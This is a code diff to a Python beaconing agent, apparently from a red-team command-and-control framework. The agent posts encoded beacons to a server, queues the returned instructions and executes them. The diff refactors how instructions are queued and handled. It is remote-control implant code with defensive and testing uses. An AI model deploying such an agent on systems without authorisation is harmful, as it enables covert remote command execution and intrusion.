@@ -6,6 +6,7 @@ import platform
 import socket
 import time
 import traceback
+from queue import Queue
 from base64 import b64encode, b64decode
 
 import requests
@@ -20,6 +21,7 @@ class OperationLoop:
         self.result_size = result_size
         self.minutes_since = minutes_since
         self.sleep = sleep
+        self.instruction_queue = Queue()
         self._profile = dict(
             server=server,
             host=socket.gethostname(),
@@ -54,7 +56,7 @@ class OperationLoop:
             try:
                 print('[*] Sending beacon for %s' % (self.paw,))
                 beacon = self._send_beacon()
-                self.sleep = self._handle_instructions(beacon)
+                self._handle_instructions()
                 time.sleep(self.sleep)
             except Exception as e:
                 print('[-] Operation loop error: %s' % e)
@@ -63,27 +65,32 @@ class OperationLoop:
 
     """ PRIVATE """
 
-    def _handle_instructions(self, beacon):
-        self._profile['paw'] = beacon['paw']
-        for instruction in json.loads(beacon['instructions']):
-            result, seconds = self._execute_instruction(json.loads(instruction))
+    def _handle_instructions(self):
+        while not self.instruction_queue.empty():
+            i = self.instruction_queue.get()
+            result, seconds = self._execute_instruction(json.loads(i))
             self._send_beacon(results=[result])
             time.sleep(seconds)
         else:
             self._send_beacon()
-        return beacon['sleep']
 
     def _next_instructions(self, beacon):
         return json.loads(self._decode_bytes(beacon['instructions']))
 
-    def _send_beacon(self, results=None):
+    def _send_beacon(self, results=None, enqueue_instructions=True):
         results = results or []
         beacon = self.get_profile()
         beacon['results'] = results
         body = self._encode_string(json.dumps(beacon))
         resp = requests.post('%s/beacon' % (self.server,), data=body)
         resp.raise_for_status()
-        return json.loads(self._decode_bytes(resp.text))
+        beacon_resp = json.loads(self._decode_bytes(resp.text))
+        self._profile['paw'] = beacon_resp['paw']
+        self.sleep = beacon_resp['sleep']
+        if enqueue_instructions and 'instructions' in beacon_resp:
+            for instruction in json.loads(beacon_resp['instructions']):
+                self.instruction_queue.put(instruction)
+        return beacon_resp
 
     def _execute_instruction(self, i):
         print('[+] Running instruction: %s' % i['id'])
